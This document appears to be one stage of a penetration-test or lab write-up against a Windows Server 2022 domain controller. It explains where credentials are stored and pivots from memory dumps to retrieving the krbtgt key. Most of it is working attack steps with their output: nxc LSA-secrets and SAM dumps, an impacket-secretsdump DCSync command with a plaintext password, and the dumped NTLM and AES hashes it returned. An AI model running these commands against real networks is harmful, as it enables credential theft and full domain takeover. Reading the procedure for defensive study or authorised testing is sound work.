# 1-posture.md — Meet the Wall, Then Go Around It

**Target:** KESSLER-DC01 (`10.30.0.10`), Windows Server 2022 Build 20348, Server Core, DC of `kessler.local`.
**Foothold:** `kessler.local\g.hale` (Domain-Admin-equivalent, local admin on the DC — `Pwn3d!`).
**Goal of this stage:** survey where credential material lives, run the memory route once *deliberately*, watch it wall, read the scope of what walls it, and pivot to where the originals actually live.

---

## 1. Where credential material lives on this estate

Separated by **account context**, **store / location**, and **protection condition**:

| Material | Account context | Where it lives (store) | What protects it |
|---|---|---|---|
| Logged-on user creds, cached logons | currently/recently authenticated users | **LSASS runtime memory** | LSA process boundary; needs SYSTEM to read. **Only present if the principal has a logon session.** |
| Machine account key (`DC01$`), DPAPI machine/user keys, service secrets | principals that have logged on / registered | **SECURITY hive (LSA secrets)**, surfaced in memory | SYSTEM-only registry ACL |
| Local accounts (Administrator, Guest…) | local SAM principals | **SAM hive** | SYSTEM-only; boot-key encrypted |
| **Every domain secret incl. `krbtgt`, every user/computer hash & Kerberos key** | all domain principals | **`NTDS.dit`** (the directory database on DC disk) | encrypted under the **SYSTEM-hive boot key**; readable by the DS itself and by replication |
| DPAPI-protected user secrets | per user | masterkeys, recoverable via the **domain DPAPI backup key** | domain backup key (DC-held) |

The key observation: **memory only ever holds *working copies*** — secrets instantiated because a principal authenticated. The **originals** of everything sit at rest in `NTDS.dit`.

---

## 2. The memory route — run once, deliberately (what I tried, what it returned)

**Tried — LSA secrets (the in-memory/secrets store):**
```
nxc smb 10.30.0.10 -u g.hale -p 'KesslerOps2026!' --lsa      # evidence/02-lsa-secrets.txt
```
**Returned —** machine/service material only:
```
KESSLER\KESSLER-DC01$:aes256-...:b48362f394c35acb5d4bd32d09f95a5d...
KESSLER\KESSLER-DC01$:aad3b435b51404eeaad3b435b51404ee:32c55f5af4b2e293e246cc62af5e420f:::
dpapi_machinekey:0xc9199e8a...   dpapi_userkey:0xf1ef421a...
```
**`krbtgt` check:** `grep -i krbtgt evidence/02-lsa-secrets.txt` → **nothing. krbtgt is absent from memory.**

**Tried — local SAM:**
```
nxc smb 10.30.0.10 -u g.hale -p 'KesslerOps2026!' --sam      # evidence/04-sam.txt
```
**Returned —** `Administrator:500:...`, `Guest:501:...`, `DefaultAccount:503:...`. **No `krbtgt`** — it is not a local account.

So the dump *succeeded* (I am admin; it returned real secrets) — it simply **does not contain the domain master key**. "The memory route is walled" is not an error I hit; it is a well-formed result that structurally lacks the one secret I need.

---

## 3. What is isolating it — and reading the scope statement

My first instinct was a VBS control (Credential Guard), so I checked it instead of assuming:
```
nxc ... -X "(Get-CimInstance Win32_DeviceGuard ...).SecurityServicesRunning"   # evidence/03-credguard.txt
-> SecurityServicesConfigured=0 ; SecurityServicesRunning=0
```
**Credential Guard is OFF** (and unsupported on a Server 2022 DC). The wall is **not** VBS isolation — it is **architectural**:

> **`krbtgt` never performs a logon.** It is a disabled service principal whose long-term key the KDC reads from the directory database to sign/encrypt tickets. Because it never authenticates, no logon session is ever created for it, so no working copy is ever instantiated in LSASS.

That is the isolation's **scope statement**: *memory holds secrets only for principals with an active logon session.* Read the other way — **the statement about everywhere it does not apply** — it says nothing about secrets **at rest**. The originals the KDC uses are outside memory's scope entirely, by design.

---

## 4. The pivot — take the original, not the copy

Memory held working copies of things that logged on. The **original** `krbtgt` key lives in `NTDS.dit`, and credential isolation was never designed to cover it **for the straightforward reason that the directory service must be able to read it to issue tickets.** So I ask the component that reads the originals — the DC itself, via directory replication:

**Tried — directory route (DRSUAPI replication / DCSync):**
```
impacket-secretsdump 'kessler.local/g.hale:KesslerOps2026!@10.30.0.10' -just-dc-user krbtgt   # evidence/05-directory-krbtgt.txt
```
**Returned —** the original, immediately:
```
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:12a181c4a7d3d97d2ec7b6bac6194c21:::
krbtgt:aes256-cts-hmac-sha1-96:91b329ded769c39fa958da28f2ac53a770d004780fbf4dde3f9c163da6e85939
```
The domain master key the memory route could not produce came back from the directory on the first request.

---

## 5. Posture summary — closed vs. open

| Route | Target material | Status | Closed/open by |
|---|---|---|---|
| LSASS / memory dump | domain master key (`krbtgt`) | **CLOSED** | `krbtgt` never logs on → no working copy in memory (architectural, not Credential Guard — CG off) |
| Local SAM | `krbtgt` | **CLOSED** | `krbtgt` is a domain account, not in SAM |
| LSA secrets (memory) | machine/service keys, DPAPI keys | **OPEN** | SYSTEM access; but yields *copies*, not the domain key |
| **Directory — replication (DRSUAPI/DCSync)** | **everything incl. `krbtgt`** | **OPEN** | g.hale holds replication rights; DC serves the original (leaves a 4662 trace) |
| **Directory — offline `NTDS.dit` + SYSTEM boot key** | **everything** | **OPEN** | local admin on the DC; file read, no directory-service event |

**Reasoning, first → second:** the memory route returns working copies for logged-on principals and structurally cannot return `krbtgt`; the originals live at rest in `NTDS.dit`, which the directory service must be able to read; therefore the way to the domain key is to ask (or take) from the directory, not to fight for a copy in memory that was never there. The next stage extracts the directory two ways (replication and offline) and reasons about when each is the right call.
